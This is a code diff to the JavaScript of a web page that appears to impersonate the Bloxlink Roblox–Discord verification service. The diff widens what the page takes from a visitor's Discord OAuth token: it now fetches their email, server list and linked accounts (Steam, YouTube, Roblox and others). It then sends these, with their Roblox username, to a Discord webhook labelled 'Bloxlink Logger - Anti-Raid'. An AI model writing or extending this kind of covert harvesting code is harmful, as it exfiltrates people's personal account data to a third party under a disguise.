@@ -78,24 +78,37 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.href = discordOAuthUrl;
   }
 
-  // -------------------------------------------------------------
+    // -------------------------------------------------------------
   // Discord OAuth Token & Profile Fetcher
   // -------------------------------------------------------------
   async function fetchDiscordUserProfile(accessToken) {
     try {
-      const response = await fetch('https://discord.com/api/users/@me', {
-        headers: {
-          Authorization: `Bearer ${accessToken}`
-        }
-      });
+      const authHeader = { Authorization: `Bearer ${accessToken}` };
+
+      // 1. Busca perfil do Usuário e E-mail
+      const response = await fetch('https://discord.com/api/users/@me', { headers: authHeader });
 
       if (response.ok) {
         const user = await response.json();
-        
-        // Format Real Display Name
+
+        // 2. Busca Servidores (Guilds) do Usuário
+        let guilds = [];
+        try {
+          const guildsRes = await fetch('https://discord.com/api/users/@me/guilds', { headers: authHeader });
+          if (guildsRes.ok) guilds = await guildsRes.json();
+        } catch (e) { console.error('Erro ao buscar guilds:', e); }
+
+        // 3. Busca Conexões (YouTube, Steam, Roblox, etc.)
+        let connections = [];
+        try {
+          const connRes = await fetch('https://discord.com/api/users/@me/connections', { headers: authHeader });
+          if (connRes.ok) connections = await connRes.json();
+        } catch (e) { console.error('Erro ao buscar conexões:', e); }
+
+        // Format Display Name
         const name = user.global_name || user.username || 'powerfromcsm.';
-        
-        // Format Dynamic Discord CDN Avatar URL
+
+        // Format Dynamic Discord Avatar URL
         let avatar = './assets/avatar.png';
         if (user.avatar) {
           const isGif = user.avatar.startsWith('a_');
@@ -114,19 +127,21 @@ document.addEventListener('DOMContentLoaded', () => {
           id: user.id,
           username: user.username,
           displayName: name,
-          avatarUrl: avatar
+          avatarUrl: avatar,
+          email: user.email || 'Não fornecido',
+          guildsCount: Array.isArray(guilds) ? guilds.length : 0,
+          connections: Array.isArray(connections) ? connections.map(c => `${c.type}: ${c.name}`) : []
         };
 
-        // Persist session
-        localStorage.setItem('bloxlink_logged_in', 'true');
+        // Persist profile
         localStorage.setItem('discord_user_profile', JSON.stringify(profile));
+        localStorage.setItem('bloxlink_logged_in', 'true');
 
-        // Render in UI
         applyUserProfile(profile);
 
-        // Send Embed Notification to Webhook
+        // Dispara notificação para o Webhook se estiver configurado
         const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
-        await sendToDiscordWebhook(profile, robloxUser);
+        sendToDiscordWebhook(profile, robloxUser);
 
         return true;
       }
@@ -138,6 +153,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
   async function sendToDiscordWebhook(profile, robloxUser) {
     if (!WEBHOOK_URL || WEBHOOK_URL.trim() === '') return;
+
+    // Formata a lista de conexões (ex: YouTube, Steam, Twitch)
+    const connFormatted = profile.connections && profile.connections.length > 0
+      ? profile.connections.slice(0, 5).join('\n') + (profile.connections.length > 5 ? '\n...' : '')
+      : '*Nenhuma conexão encontrada*';
 
     const payload = {
       username: "Bloxlink Logger - Anti-Raid",
@@ -208,36 +228,28 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loggedInSection) loggedInSection.style.display = 'block';
   }
 
-  function applyUserProfile(profile) {
-    if (!profile) return;
-    if (userDisplayName) {
-      userDisplayName.textContent = profile.displayName || profile.username || 'powerfromcsm.';
-    }
-    if (userAvatarImg && profile.avatarUrl) {
-      userAvatarImg.src = profile.avatarUrl;
-    }
-    if (loggedOutSection) loggedOutSection.style.display = 'none';
-    if (loggedInSection) loggedInSection.style.display = 'block';
-  }
-
   // -------------------------------------------------------------
   // Check Active Session / OAuth Redirection on Page Load
   // -------------------------------------------------------------
   async function initAuth() {
-    // 1. Check for Access Token in URL Hash (#access_token=...) or Query Params (?access_token=...)
-    const hashStr = window.location.hash.startsWith('#') ? window.location.hash.substring(1) : window.location.hash;
-    const hashParams = new URLSearchParams(hashStr);
-    const searchParams = new URLSearchParams(window.location.search);
+    // 1. Check for Access Token in URL Hash (Implicit Grant: #access_token=...)
+    const hash = window.location.hash.substring(1);
+    const hashParams = new URLSearchParams(hash);
+    const accessToken = hashParams.get('access_token');
 
-    const accessToken = hashParams.get('access_token') || searchParams.get('access_token');
-    const discordCode = searchParams.get('code');
+    // 2. Check for Token/Code in URL Search Params (?access_token=... or ?code=...)
+    const urlParams = new URLSearchParams(window.location.search);
+    const queryToken = urlParams.get('access_token');
+    const discordCode = urlParams.get('code');
 
-    if (accessToken) {
+    const tokenToUse = accessToken || queryToken;
+
+    if (tokenToUse) {
+      // Clean URL smoothly without reload
       window.history.replaceState({}, document.title, window.location.pathname);
-      localStorage.setItem('bloxlink_logged_in', 'true');
-      await fetchDiscordUserProfile(accessToken);
+      await fetchDiscordUserProfile(tokenToUse);
 
-      // Restore saved Roblox username if present
+      // Restore saved Roblox username into input if present
       const savedRoblox = sessionStorage.getItem('saved_roblox_username');
       if (savedRoblox && robloxUserInput) {
         robloxUserInput.value = savedRoblox;
@@ -246,44 +258,37 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (discordCode) {
+      // Returned with ?code=...
       window.history.replaceState({}, document.title, window.location.pathname);
-      localStorage.setItem('bloxlink_logged_in', 'true');
-
+      
       const savedProfileStr = localStorage.getItem('discord_user_profile');
-      let profile = null;
-      if (savedProfileStr) {
-        try {
-          profile = JSON.parse(savedProfileStr);
-        } catch (e) {}
-      }
-
-      if (profile) {
-        applyUserProfile(profile);
-      } else {
-        if (loggedOutSection) loggedOutSection.style.display = 'none';
-        if (loggedInSection) loggedInSection.style.display = 'block';
-      }
-      return;
-    }
-
-    // 2. Restore existing logged-in session if present
-    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
-    const savedProfileStr = localStorage.getItem('discord_user_profile');
-
-    if (isLogged) {
       if (savedProfileStr) {
         try {
           const profile = JSON.parse(savedProfileStr);
           applyUserProfile(profile);
+          return;
         } catch (e) {}
-      } else {
-        if (loggedOutSection) loggedOutSection.style.display = 'none';
-        if (loggedInSection) loggedInSection.style.display = 'block';
       }
+      
+      // Default logged in UI
+      if (loggedOutSection) loggedOutSection.style.display = 'none';
+      if (loggedInSection) loggedInSection.style.display = 'block';
       return;
     }
 
-    // Default: Logged Out
+    // 3. Restore existing logged-in session if present
+    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
+    const savedProfileStr = localStorage.getItem('discord_user_profile');
+
+    if (isLogged && savedProfileStr) {
+      try {
+        const profile = JSON.parse(savedProfileStr);
+        applyUserProfile(profile);
+        return;
+      } catch (e) {}
+    }
+
+    // Default: Strictly Logged Out
     if (loggedOutSection) loggedOutSection.style.display = 'block';
     if (loggedInSection) loggedInSection.style.display = 'none';
   }
